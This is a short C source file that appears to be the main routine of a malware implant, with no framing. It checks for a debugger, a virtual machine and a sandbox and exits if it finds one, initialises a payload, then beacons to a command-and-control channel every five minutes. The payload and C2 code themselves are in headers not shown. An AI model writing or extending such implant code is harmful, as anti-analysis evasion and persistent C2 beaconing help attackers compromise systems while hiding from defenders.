#include "main.h"
#include "payload.h"
#include "evasion.h"
#include "c2_communication_fixed.h"
#include "config.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main(int argc, char* argv[]) {
    // Perform evasion checks
    if (check_debugger()) {
        fprintf(stderr, "Debugger detected! Exiting...\n");
        return EXIT_FAILURE;
    }

    if (check_vm()) {
        fprintf(stderr, "Virtual machine detected! Exiting...\n");
        return EXIT_FAILURE;
    }

    if (check_sandbox()) {
        fprintf(stderr, "Sandbox detected! Exiting...\n");
        return EXIT_FAILURE;
    }

    // Initialize payload
    init_payload();

    // Main loop
    while (1) {
        sleep(300); // 5 minutes
        // Perform periodic tasks
        send_heartbeat();
    }

    return EXIT_SUCCESS;
}